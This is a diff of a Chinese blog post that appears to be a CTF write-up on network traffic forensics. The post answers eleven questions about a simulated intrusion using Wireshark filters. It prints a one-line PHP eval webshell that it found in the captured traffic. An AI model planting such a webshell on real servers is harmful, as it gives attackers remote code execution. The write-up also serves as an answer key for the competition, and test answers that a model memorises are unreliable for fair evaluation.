@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="首先简单记录一下 流量包下载地址：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;13SoD6xB7YBiqpUDCIcb8mg 第一题某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器 一开始以为是sqlmap,不过后来发现有awvs的痕迹  那么显然扫描器填awvs 第二题某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可) 直接过滤post的包  第三题某">
+    <meta name="description" content="首先 简单记录一下 流量包下载地址：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;13SoD6xB7YBiqpUDCIcb8mg 第一题 某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器 一开始以为是sqlmap,不过后来发现有awvs的痕迹  那么显然扫描器填awvs 第二题 某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可) 直接过滤post的包  第">
 <meta property="og:type" content="article">
 <meta property="og:title" content="安恒8月月赛流量分析">
 <meta property="og:url" content="http://example.com/2018/08/31/%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="blacsheep&#39;s blog">
-<meta property="og:description" content="首先简单记录一下 流量包下载地址：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;13SoD6xB7YBiqpUDCIcb8mg 第一题某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器 一开始以为是sqlmap,不过后来发现有awvs的痕迹  那么显然扫描器填awvs 第二题某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可) 直接过滤post的包  第三题某">
+<meta property="og:description" content="首先 简单记录一下 流量包下载地址：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;13SoD6xB7YBiqpUDCIcb8mg 第一题 某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器 一开始以为是sqlmap,不过后来发现有awvs的痕迹  那么显然扫描器填awvs 第二题 某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可) 直接过滤post的包  第">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/2018/08/2018-08-28-19-56-56%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="og:image" content="http://example.com/images/2018/08/2018-08-28-20-44-06%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
@@ -184,33 +184,42 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>简单记录一下 流量包下载地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg" title="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg">https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg</a></p>
-<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器</strong> 一开始以为是sqlmap,不过后来发现有awvs的痕迹 <img src="/images/2018/08/2018-08-28-19-56-56%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 那么显然扫描器填awvs</p>
-<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可)</strong> 直接过滤post的包 <img src="/images/2018/08/2018-08-28-20-44-06%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
-<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，得到黑客使用了什么账号密码登陆了web后台(形式:username&#x2F;password)</strong> 查看post到后台的包,然后查看双方的包,成功的包会302,否则显示错误 成功的包 <img src="/images/2018/08/2018-08-28-20-55-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> <img src="/images/2018/08/2018-08-28-20-53-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 然后失败的包 <img src="/images/2018/08/2018-08-28-20-57-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
-<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码</strong> 菜刀连的webshell一般都经过了base64,所以直接过滤</p>
+    <h2 id="首先">首先</h2>
+<p>简单记录一下 流量包下载地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg" title="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg">https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg</a></p>
+<h2 id="第一题">第一题</h2>
+<p><strong>某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器</strong> 一开始以为是sqlmap,不过后来发现有awvs的痕迹 <img src="/images/2018/08/2018-08-28-19-56-56屏幕截图.png" alt="blacsheep" /> 那么显然扫描器填awvs</p>
+<h2 id="第二题">第二题</h2>
+<p><strong>某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可)</strong> 直接过滤post的包 <img src="/images/2018/08/2018-08-28-20-44-06屏幕截图.png" alt="blacsheep" /></p>
+<h2 id="第三题">第三题</h2>
+<p><strong>某公司内网网络被黑客渗透，请分析流量，得到黑客使用了什么账号密码登陆了web后台(形式:username/password)</strong> 查看post到后台的包,然后查看双方的包,成功的包会302,否则显示错误 成功的包 <img src="/images/2018/08/2018-08-28-20-55-22屏幕截图.png" alt="blacsheep" /> <img src="/images/2018/08/2018-08-28-20-53-28屏幕截图.png" alt="blacsheep" /> 然后失败的包 <img src="/images/2018/08/2018-08-28-20-57-57屏幕截图.png" alt="blacsheep" /></p>
+<h2 id="第四题">第四题</h2>
+<p><strong>某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码</strong> 菜刀连的webshell一般都经过了base64,所以直接过滤</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;base64_decode&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/2018/08/2018-08-31-14-45-59%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 发现了shell,文件名a.php,密码1234 猜测webshell是</p>
+<p><img src="/images/2018/08/2018-08-31-14-45-59屏幕截图.png" alt="blacsheep" /> 发现了shell,文件名a.php,密码1234 猜测webshell是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1234]);?&gt;</span><br></pre></td></tr></table></figure>
-
 <p>然后成功了</p>
-<h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客在robots.txt中找到的flag是什么</strong> 直接</p>
+<h2 id="第五题">第五题</h2>
+<p><strong>某公司内网网络被黑客渗透，请分析流量，黑客在robots.txt中找到的flag是什么</strong> 直接</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;robots.txt&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/2018/08/2018-08-31-14-55-54%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
-<h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客找到的数据库密码是多少</strong> 这个在看a.php的response的时候发现读了config</p>
+<figure>
+<img src="/images/2018/08/2018-08-31-14-55-54屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption>
+</figure>
+<h2 id="第六题">第六题</h2>
+<p><strong>某公司内网网络被黑客渗透，请分析流量，黑客找到的数据库密码是多少</strong> 这个在看a.php的response的时候发现读了config</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&lt;?php&quot;</span><br></pre></td></tr></table></figure>
-
-<p>然后找到 <img src="/images/2018/08/2018-08-31-14-59-34%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
-<h2 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客在数据库中找到的hash_code是什么</strong> <img src="/images/2018/08/2018-08-31-15-05-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
-<h2 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客破解了账号<a href="mailto:&#x69;&#106;&#110;&#x75;&#x40;&#x74;&#x65;&#x73;&#116;&#x2e;&#99;&#x6f;&#x6d;">&#x69;&#106;&#110;&#x75;&#x40;&#x74;&#x65;&#x73;&#116;&#x2e;&#99;&#x6f;&#x6d;</a>得到的密码是什么</strong> <img src="/images/2018/08/2018-08-31-15-07-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 然后解一下 <img src="/images/2018/08/2018-08-31-15-10-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
-<h2 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</strong> 还是</p>
+<p>然后找到 <img src="/images/2018/08/2018-08-31-14-59-34屏幕截图.png" alt="blacsheep" /></p>
+<h2 id="第七题">第七题</h2>
+<p><strong>某公司内网网络被黑客渗透，请分析流量，黑客在数据库中找到的hash_code是什么</strong> <img src="/images/2018/08/2018-08-31-15-05-31屏幕截图.png" alt="blacsheep" /></p>
+<h2 id="第八题">第八题</h2>
+<p><strong>某公司内网网络被黑客渗透，请分析流量，黑客破解了账号ijnu@test.com得到的密码是什么</strong> <img src="/images/2018/08/2018-08-31-15-07-50屏幕截图.png" alt="blacsheep" /> 然后解一下 <img src="/images/2018/08/2018-08-31-15-10-22屏幕截图.png" alt="blacsheep" /></p>
+<h2 id="第九题">第九题</h2>
+<p><strong>某公司内网网络被黑客渗透，请分析流量，被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</strong> 还是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;eth0&quot;</span><br></pre></td></tr></table></figure>
-
-<p>然后找到了a.php的记录 <img src="/images/2018/08/2018-08-31-15-27-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
-<h2 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客使用了什么账号登陆了mail系统（形式: username&#x2F;password）</strong> 同第三题</p>
-<h2 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a>第十一题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn,ip是多少</strong> 查看tcp流,提交一下两个流量最多的ip 发现答案是10.3.4.3</p>
+<p>然后找到了a.php的记录 <img src="/images/2018/08/2018-08-31-15-27-11屏幕截图.png" alt="blacsheep" /></p>
+<h2 id="第十题">第十题</h2>
+<p><strong>某公司内网网络被黑客渗透，请分析流量，黑客使用了什么账号登陆了mail系统（形式: username/password）</strong> 同第三题</p>
+<h2 id="第十一题">第十一题</h2>
+<p><strong>某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn,ip是多少</strong> 查看tcp流,提交一下两个流量最多的ip 发现答案是10.3.4.3</p>
 
   </div>
 </article>
